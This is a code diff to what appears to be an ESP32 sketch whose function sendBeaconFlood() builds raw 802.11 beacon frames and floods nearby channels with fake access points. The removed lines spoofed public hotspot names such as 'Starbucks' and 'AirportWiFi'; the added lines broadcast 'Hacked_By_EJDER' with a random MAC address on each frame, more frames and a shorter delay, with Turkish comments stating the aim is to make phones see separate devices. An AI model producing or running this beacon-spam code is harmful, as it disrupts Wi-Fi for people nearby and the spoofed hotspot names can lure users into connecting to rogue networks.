@@ -43,21 +43,32 @@ void sendBeaconFlood() {
     0x80, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x04,
-    0x00, 0x00, // SSID tag
+    0x00, 0x00, 
     0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
     0x03, 0x01, 0x06
   };
-  String fakeSSIDs[] = {"FreeWiFi", "PublicWiFi", "Starbucks", "McDonalds", "AirportWiFi", "GUEST_ACCESS"};
-  for (int i = 0; i < 5; i++) {
-    for (int j = 0; j < 6; j++) { packet[10 + j] = packet[16 + j] = random(256); }
-    String ssid = fakeSSIDs[random(6)];
-    packet[37] = ssid.length();
-    for (int j = 0; j < ssid.length(); j++) { packet[38 + j] = ssid[j]; }
-    int chan = random(1, 14);
+
+  
+  String targetSSID = "Hacked_By_EJDER"; 
+
+  for (int i = 0; i < 15; i++) { // Sayıyı 15'e çıkardım, daha yoğun olsun
+    // MAC adresini (BSSID) her seferinde rastgele yapıyoruz ki telefon ayrı cihaz sansın
+    for (int j = 0; j < 6; j++) { 
+      packet[10 + j] = packet[16 + j] = random(256); 
+    }
+    
+    packet[37] = targetSSID.length();
+    for (int j = 0; j < targetSSID.length(); j++) { 
+      packet[38 + j] = targetSSID[j]; 
+    }
+
+    
+    int chan = (i % 13) + 1; 
     packet[50] = chan;
+    
     esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_80211_tx(WIFI_IF_AP, packet, 38 + ssid.length() + 12, false);
-    delay(5);
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, 38 + targetSSID.length() + 12, false);
+    delay(2); 
   }
 }
 
